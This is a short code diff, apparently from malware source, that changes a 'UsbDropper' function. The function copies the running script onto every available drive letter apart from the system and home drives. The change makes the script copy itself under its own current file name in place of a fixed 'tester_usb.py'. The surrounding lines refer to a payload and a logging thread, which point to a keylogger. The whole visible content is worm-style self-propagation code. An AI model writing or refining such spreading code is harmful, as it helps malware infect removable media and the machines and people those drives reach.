@@ -143,6 +143,7 @@ Payload()
 LOGTHREAD.join()
 
 def UsbDropper():
+    MyCurrentLocation = path.basename(argv[0])
     DriveLetters = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "Y:", "X:", "Z:"]
     if environ['SystemDrive'] == environ['HomeDrive']:
         DriveLetters.remove(environ['SystemDrive'])
@@ -151,7 +152,7 @@ def UsbDropper():
         DriveLetters.remove(environ['HomeDrive'])
     for x in DriveLetters:
         try:
-            copy("tester_usb.py", x+"\\")
+            copy(MyCurrentLocation, x+"\\")
         except FileNotFoundError:
             pass
 
